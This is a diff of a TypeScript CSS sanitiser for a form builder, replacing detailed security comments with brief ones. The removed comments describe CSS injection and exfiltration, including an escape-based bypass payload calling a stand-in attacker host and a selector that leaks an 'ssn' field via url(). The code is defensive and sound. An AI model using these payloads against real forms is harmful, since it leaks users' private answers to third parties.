@@ -46,82 +46,15 @@ export const DEVICE_QUERY: Record<Exclude<Device, 'any'>, string> = {
   desktop: '(min-width: 1024px)',
 }
 
-/**
- * Characters that would let a declaration stop being a declaration.
- *
- * `{` and `}` end the block and start a new rule, which is how a component's
- * styling would reach the whole page. `<` is how it would leave CSS entirely,
- * since this text is placed inside a `<style>` element and `</style>` closes
- * it. `@` opens an at-rule, and `@import` fetches from wherever it likes.
- *
- * A comment belongs here too, and it does not end the block so much as swallow
- * it. One node opens a comment at the end of its declarations and another
- * closes one at the start of its own; the two are concatenated into a single
- * stylesheet, and everything between them disappears inside it. A third node's
- * rule is deleted, and one node's declaration lands under another's selector.
- *
- * That cannot reach outside the form, so it is not the injection
- * `safeStyleValue` is for. What it breaks is the sentence this file opens with:
- * a component's styling affects that component.
- *
- * Refused as a set rather than escaped, and both halves of the pair rather than
- * only the opener, because deciding which comment is safe invites an argument
- * this does not need.
- *
- * The backslash belongs in this set and was missing from it, which made the
- * `FETCHING` refusal below bypassable and put the exfiltration channel back.
- * CSS consumes escapes while building an identifier, so `\75 rl(` tokenises as
- * the `url(` function with none of its letters ever appearing -- and `FETCHING`
- * matches letters. A Style tab block of
- * `background:\75 rl(https://attacker.example/beacon)` passed
- * `safeDeclarations`, reached the page through the renderer's `<style>`, and
- * issued a request from the form that is collecting the answers.
- *
- * `FORBIDDEN_VALUE`, the grammar for the other sink, has carried the backslash
- * for a while under a comment naming this exact technique. This list is the one
- * that did not get it. Two sinks, two grammars, and only one of them was
- * checked.
- *
- * Nothing legitimate in a declaration block needs a backslash. It is an escape
- * hatch in a language the author is typing by hand, and every real value --
- * a colour, a length, a font stack -- is spelled without one.
- */
+/** Tokens that can escape, obscure, or extend the generated declaration block. */
 const FORBIDDEN = /[{}<@\\]|\/\*|\*\//
 
-/**
- * Whether every quote in a declaration block is closed.
- *
- * `FORBIDDEN` refuses a literal `}`, and a `}` inside an unterminated string is
- * not one it can see: `content: "` swallows the closing brace of its own rule
- * and every rule after it until the next quote, so a third component's
- * declarations land under this one's selector. The same breakage the brace check
- * exists to stop, arriving by a route it does not look at.
- *
- * Balance rather than parsing: a declaration block with an odd number of either
- * quote is refused, which is a rule an author can predict and a check that
- * cannot be talked around.
- */
+/** True when neither quote style is left open. */
 function quotesBalanced(text: string): boolean {
   let single = 0
   let double = 0
   for (let i = 0; i < text.length; i += 1) {
-    /*
-     * The escape skip stays, and it was never the whole story.
-     *
-     * Skipping the character after a backslash meant `color:red\` counted as
-     * balanced -- the trailing backslash consumed the end of the string, so
-     * nothing was ever left unbalanced -- and `styleSheetFor` then emitted
-     * `…{color:red\}`, where `\}` is a valid escape inside the value token and
-     * the block is never closed. One component with a trailing backslash
-     * silently deleted every rule emitted after it and absorbed the following
-     * components' declarations: exactly the breakage this function was added
-     * for, arriving by the route the fix did not look at.
-     *
-     * `FORBIDDEN` refuses the backslash outright now, so a block reaching here
-     * carrying one has already been refused and this loop never sees the case.
-     * The skip is kept because this function reasons about a raw string on its
-     * own and must not depend on the order the two checks happen to run in.
-     */
+    // Keep this helper correct when called independently of the token check.
     if (text[i] === '\\') {
       i += 1
       continue
@@ -141,27 +74,13 @@ function quotesBalanced(text: string): boolean {
  */
 export function safeDeclarations(text: string | undefined): string | undefined {
   if (!text) return undefined
-  /*
-   * A document is data, so `css.mobile` can be a number or an object, and
-   * `.trim()` on one throws out of `styleSheetFor` -- which the renderer calls
-   * during render, so the whole form goes. Refused rather than coerced: a
-   * stylesheet is text, and something that is not text is not a stylesheet.
-   */
+  // Documents are external data; a non-string style is simply unusable.
   if (typeof text !== 'string') return undefined
   const trimmed = text.trim()
   if (!trimmed) return undefined
   if (FORBIDDEN.test(trimmed)) return undefined
   if (!quotesBalanced(trimmed)) return undefined
-  /*
-   * And the raw block may not fetch either.
-   *
-   * `safeStyleValue` refuses `url(...)` by name, calling it an exfiltration
-   * channel: a request keyed off a field, from a page collecting answers, to an
-   * address the document chose. The raw Style tab block reached the page through
-   * a `<style>` element and was never asked. Two sinks for author-supplied CSS,
-   * one of them checked, and the unchecked one is the one that takes arbitrary
-   * text.
-   */
+  // Authored styles cannot initiate resource requests.
   if (FETCHING.test(trimmed)) return undefined
   return trimmed
 }
@@ -183,22 +102,7 @@ export function safeDeclarations(text: string | undefined): string | undefined {
 // eslint-disable-next-line no-control-regex
 const FORBIDDEN_VALUE = /[{}<@;!\\]|\/\*|[\u0000-\u001f\u007f]/
 
-/**
- * Value functions that fetch, or that paint something the author did not author.
- *
- * Refused on top of the character set, because a fetch is not an injection and
- * the character set does not catch one. `url(https://…)` is well-formed CSS that
- * both sinks accept, and on a page whose whole purpose is collecting answers,
- * `[data-fs-key="ssn"]{background:url(…)}` is an exfiltration channel rather
- * than a broken rule.
- *
- * These are refused rather than escaped for the same reason the declaration
- * list refuses braces, and the domain agrees: the only string-typed style value
- * either kit exposes is `background`, whose declared editor is `color`, and a
- * URL is not a colour. The Style tab remains the channel for real CSS.
- *
- * Written as substrings so a vendor prefix is covered by the unprefixed name.
- */
+/** Resource-producing CSS functions, matched inside vendor-prefixed spellings too. */
 const FETCHING = /(url|image-set|element|cross-fade)\s*\(/i
 
 /**
@@ -220,23 +124,7 @@ export function safeStyleValue(value: string | undefined): string | undefined {
   return trimmed
 }
 
-/**
- * A key, as a CSS string, safe to place inside a `<style>` element.
- *
- * Keys are validated as non-empty and nothing else, and a document is data, so
- * a key holding `</style>` is a string somebody can type. Quoting the attribute
- * selector stops that breaking the *selector*; it does nothing about breaking
- * out of the style element itself, which is script injection rather than a
- * broken rule. `<` is escaped for that reason rather than for CSS's.
- *
- * Six-digit hex escapes with a space after them, which is what the grammar
- * wants: a CSS parser reads at most six hex digits and then swallows one
- * following whitespace character as the terminator. Without a space of our own
- * it swallowed the author's -- a key of `" b` produced an escape followed by
- * the real space, which parses as `"b`, so the selector named a string the
- * attribute does not hold and the rule matched nothing. Control characters go
- * the same way: a raw newline ends a CSS string.
- */
+/** Encode an external key as a CSS string using fixed-width hexadecimal escapes. */
 function escapeKey(key: string): string {
   return key.replace(
     // The control range is the point, not an accident: a raw newline or a NUL
@@ -283,23 +171,7 @@ export function styleSheetFor(root: ComponentNode, options: StyleSheetOptions = 
     const css = node.css
     if (!css) return
 
-    /*
-     * The key is checked before it is escaped, and it was not.
-     *
-     * `selectorFor` calls `escapeKey`, which calls `key.replace`, so a node
-     * carrying a `css` block and `"key": 42` threw `TypeError` -- and this walk
-     * runs inside the renderer's `useMemo`, where a throw in React 19 takes the
-     * whole form off screen for somebody who cannot edit the document.
-     * `validateDocument` reports a non-string key without preventing it, and
-     * `store.ts` only warns.
-     *
-     * `walk` guards the node's shape and not the key's type. `context.ts`
-     * hardened `evaluatorKeys` against this exact document and `context.test.ts`
-     * has the row for it; this sink did not.
-     *
-     * Skipped rather than refused: a node whose key is not a string has no
-     * selector to write, and the rest of the sheet is still worth emitting.
-     */
+    // Invalid nodes are omitted without suppressing usable rules from siblings.
     if (typeof node.key !== 'string') return
 
     const selector = selectorFor(node.key, scope)
@@ -331,27 +203,6 @@ export function styleSheetFor(root: ComponentNode, options: StyleSheetOptions = 
   return [...base, ...media].join('')
 }
 
-/**
- * The declarations in a block, in the order they were written.
- *
- * The Style tab offers structured controls and a raw field over one string, so
- * both have to read and write the same text. Storing them separately would be
- * two sources for one value and a merge nobody can specify.
- *
- * Small, but not as small as `text.split(';')`, which was the first version and
- * was wrong. A `;` is only a separator at the top level: inside quotes it is
- * text, and inside parentheses it belongs to the function. `background:
- * url(data:image/svg+xml;base64,…)` is the case that matters, because a data
- * URI has a `;` in the middle of it and splitting there truncates the value.
- *
- * That is worse than a display bug. The Style tab's structured controls rewrite
- * this text every time one of them is touched, so editing the padding would
- * silently destroy a background nobody was editing, and the promise that a
- * control only ever touches its own declaration would be false.
- *
- * A `:` inside a value is the same problem in miniature, which is why the split
- * between name and value walks rather than calling `indexOf`.
- */
 export function parseDeclarations(text: string | undefined): [string, string][] {
   if (!text) return []
 
@@ -426,14 +277,6 @@ export function printDeclarations(declarations: [string, string][]): string {
   return declarations.map(([name, value]) => name + ': ' + value).join(';\n')
 }
 
-/**
- * The text with one property set, replaced, or removed.
- *
- * Order is preserved and unknown declarations are left alone, so a structured
- * control never discards something it does not have a widget for. That is the
- * property that lets the two editors share a string: the raw field can hold
- * anything, and the controls only ever touch their own line.
- */
 export function setDeclaration(
   text: string | undefined,
   name: string,
